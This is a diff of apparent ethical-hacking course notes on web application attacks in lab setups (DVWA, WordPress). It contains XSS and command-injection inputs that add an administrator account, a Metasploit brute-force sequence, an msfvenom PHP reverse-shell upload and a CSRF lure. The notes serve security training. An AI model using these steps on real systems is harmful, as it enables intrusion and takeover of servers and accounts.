@@ -1,63 +1,51 @@
 # Module 14 - Hacking Web Applications #
 
-## Exploiting Parameter Tampering and XSS Vulnerabilities in Web Applications ##
-Changing URL parameters to obtain users information. Adding ``` <script>You've been Hacked</script> ``` to a field that reflects information.
+## Footprint the Web Infrastructure ##
 
-- - - -
+### Web Application Reconnaissance ###
+#### WhatWeb ####
 
-## Enumerating and Hacking a Web Application ##
-
-### WPScan ###
-``` wpscan --url <URL> --enumerate u ``` - Enumerates WordPress information.
-
-### Metasploit ###
-``` msfconsole ```
-
-1. ``` use auxiliary/scanner/http/wordpress_login_enum ```
-2. ``` show options ```, ``` set PASS_FILE <Path to the Password Wordlist File> ```, ``` set RHOSTS <Target IP> ```, ``` set RPORT <Target Website Port> ```, ``` set TARGETURI <Target URL> ```, ``` set USERNAME <Username to Crack the Password - Ex. admin> ```
-3. ``` exploit ```
-
-Try the credentials in ``` <URL>/wp-login.php ```.
+#### OWASP ZAP ####
 
 
-- - - -
-
-## Exploiting Remote Command Execution Vulnerability to Compromise a Target Web Server ##
-Dvwa:
-
-``` ping 10.10.10.10 | net user test /add ``` - To add a user 
-``` | net localgroup Administrators test /add ``` - Add the user to the Administrators group
+### Detect Load Balancers ###
 
 
-- - - -
+### Identify Web Server Directories ###
 
-## Auditing Web Application Framework ##
 
-### Vega ###
+### Web Application Vulnerability Scanning ###
+#### Vega ####
 Scan > Start New Scan > Enter a Base URI for Scan
 
-
-- - - -
-
-## Website Vulnerability Scanning ##
-
-### Acunetix WVS ###
+#### Acunetix WVS ####
 1. Add Target
 2. General > Business Criticality: High
 3. Scan > Select the Scan Type, Report and Schedule
 
 
-- - - -
 
-## Exploiting File Upload at Different Security Levels ##
-``` msfvenom -p php/meterpreter/reverse_tcp lhost=<Attacker IP> lport=<Attacker Listener Port> -f raw ``` - Generating the payload. Copy it to a .php file and upload it to the vulnerable functionality. 
-
-Set up the listener. To execute the payload, navigate to the uploaded file in the browser.
+### Identify Clickjacking Vulnerabilities ###
+#### iframe ####
 
 
 - - - -
 
-## Performing Cross-Site Request Forgery (CSRF) Attack ##
+## Perform Web Application Attacks ##
+
+### Brute-Force Attack ###
+#### Burp Suite ####
+
+
+### Parameter Tampering ###
+#### Burp Suite ####
+
+
+### Cross-Site Scripting (XSS) ###
+Changing URL parameters to obtain users information. Adding ``` <script>You've been Hacked</script> ``` to a field that reflects information.
+
+
+### Cross-Site Request Forgery (CSRF) ###
 CSRF in a Wordpress site.
 
 ### WPScan ###
@@ -74,3 +62,47 @@ Create the _HTML_ file:
 ```
 
 Lure the victim to execute the script and click on 'Submit'. It will perform the actions in the script: whitelisting the attacker IP so that the firewall does not affect its requests.
+
+
+### Enumerate and Hack a Web Application ###
+#### WPScan ####
+``` wpscan --url <URL> --enumerate u ``` - Enumerates WordPress information.
+
+#### Metasploit ####
+``` msfconsole ```
+
+1. ``` use auxiliary/scanner/http/wordpress_login_enum ```
+2. ``` show options ```, ``` set PASS_FILE <Path to the Password Wordlist File> ```, ``` set RHOSTS <Target IP> ```, ``` set RPORT <Target Website Port> ```, ``` set TARGETURI <Target URL> ```, ``` set USERNAME <Username to Crack the Password - Ex. admin> ```
+3. ``` exploit ```
+
+Try the credentials in ``` <URL>/wp-login.php ```.
+
+
+### Exploit a Remote Command Execution (RCE) Vulnerability ###
+Dvwa:
+
+``` ping 10.10.10.10 | net user test /add ``` - To add a user 
+
+``` | net localgroup Administrators test /add ``` - Add the user to the Administrators group
+
+
+### Exploit a File Upload Vulnerability ###
+``` msfvenom -p php/meterpreter/reverse_tcp lhost=<Attacker IP> lport=<Attacker Listener Port> -f raw ``` - Generating the payload. Copy it to a .php file and upload it to the vulnerable functionality. 
+
+Set up the listener. To execute the payload, navigate to the uploaded file in the browser.
+
+
+### Gain Backdoor Access via a Web Shell ###
+#### Weevely ####
+
+
+
+- - - -
+
+## Detect Web Application Vulnerabilities ##
+### N-Stalker Web Application Security Scanner ###
+
+
+
+
+
